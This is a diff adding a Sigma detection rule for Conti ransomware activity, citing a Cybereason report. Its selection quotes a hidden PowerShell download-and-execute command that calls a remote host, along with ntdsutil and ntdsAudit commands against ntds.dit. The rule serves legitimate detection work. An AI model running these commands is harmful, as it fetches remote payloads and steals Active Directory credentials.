@@ -1,0 +1,26 @@
+title: "Conti Actors Detects Powershell Downloads"
+description: "Conti actors download the malware to the computer with the powershell command. It continues its operations with the help of ntdsutil tool."
+author: Furkan Celik
+status: "stable"
+tags:
+- attack.T1003
+- attack.t1486
+- attack.impact
+- attack.credential_access
+references:
+- https://www.cybereason.com/blog/threat-analysis-report-from-shatak-emails-to-the-conti-ransomware
+logsource:
+  product: windows
+  category: powershell
+detection:
+  condition: selection
+  selection:
+    CommandLine|contains|all:
+    - powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring("https://datasecuritytoday.com:757/securiday"))"
+    - ntdsutil
+    - ntdsAudit.exe ntds.dit
+fields:
+- "CommandLine"
+falsepositives:
+- "unknown"
+level: "high"
